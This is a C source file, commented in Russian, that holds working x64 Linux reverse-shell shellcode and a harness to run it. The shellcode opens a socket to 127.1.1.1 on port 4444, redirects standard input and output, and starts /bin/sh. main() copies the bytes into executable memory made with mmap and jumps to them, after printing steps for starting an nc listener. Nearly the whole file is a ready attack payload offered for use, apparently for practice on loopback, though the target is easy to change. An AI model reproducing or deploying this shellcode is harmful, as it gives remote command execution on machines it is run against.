#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

/*
    REVERSE SHELL v3 (Stable)
    Target: 127.1.1.1 : 4444
    Arch: Linux x64
    Method: Push-stack (No Null Bytes)
*/

unsigned char shellcode[] = 
    // 1. Создаем сокет socket(2, 1, 0)
    "\x6a\x29"                  // push 41 (syscall socket)
    "\x58"                      // pop rax
    "\x99"                      // cdq (обнуляет rdx, если rax положителен)
    "\x6a\x02"                  // push 2 (AF_INET)
    "\x5f"                      // pop rdi
    "\x6a\x01"                  // push 1 (SOCK_STREAM)
    "\x5e"                      // pop rsi
    "\x0f\x05"                  // syscall
    
    // 2. Сохраняем дескриптор сокета
    "\x48\x97"                  // xchg rax, rdi (теперь rdi = sockfd)
    
    // 3. Подключаемся connect(rdi, &addr, 16)
    // Строим структуру sockaddr_in на стеке:
    // IP: 127.1.1.1 = 0x0101017f
    // Port: 4444    = 0x115c (Big Endian 0x5c11)
    // Family: 2     = 0x0002
    
    "\x48\xb8\x02\x00\x11\x5c\x7f\x01\x01\x01" // mov rax, 0x0101017f5c110002
    "\x50"                      // push rax (кладем всё это на стек)
    "\x48\x89\xe6"              // mov rsi, rsp (rsi указывает на структуру)
    "\x6a\x10"                  // push 16 (addrlen)
    "\x5a"                      // pop rdx
    "\x6a\x2a"                  // push 42 (syscall connect)
    "\x58"                      // pop rax
    "\x0f\x05"                  // syscall

    // 4. Перенаправляем ввод-вывод (dup2 loop)
    "\x6a\x03"                  // push 3
    "\x5e"                      // pop rsi (счетчик = 3)
    "\x48\xff\xce"              // dec rsi (счетчик = 2 -> stderr)
    "\x6a\x21"                  // push 33 (syscall dup2)
    "\x58"                      // pop rax
    "\x0f\x05"                  // syscall
    "\x75\xf6"                  // jne (прыгаем назад, пока rsi не станет -1)

    // 5. Запускаем /bin/sh (execve)
    "\x6a\x3b"                  // push 59 (execve)
    "\x58"                      // pop rax
    "\x99"                      // cdq (rdx = 0)
    "\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68" // mov rbx, "//bin/sh"
    "\x53"                      // push rbx
    "\x48\x89\xe7"              // mov rdi, rsp
    "\x52"                      // push rdx (0) - для argv
    "\x57"                      // push rdi - для argv
    "\x48\x89\xe6"              // mov rsi, rsp
    "\x0f\x05";                 // syscall

int main() {
    printf("Shellcode Length: %ld\n", sizeof(shellcode) - 1);

    // Выделяем RWX память
    void *ptr = mmap(0, sizeof(shellcode),
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (ptr == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    // Копируем
    memcpy(ptr, shellcode, sizeof(shellcode) - 1);

    printf("1. В соседнем терминале запусти: nc -lvnp 4444\n");
    printf("2. Нажми Enter здесь...\n");
    getchar(); // Ждем нажатия

    // Запускаем
    ((void(*)())ptr)();

    return 0;
}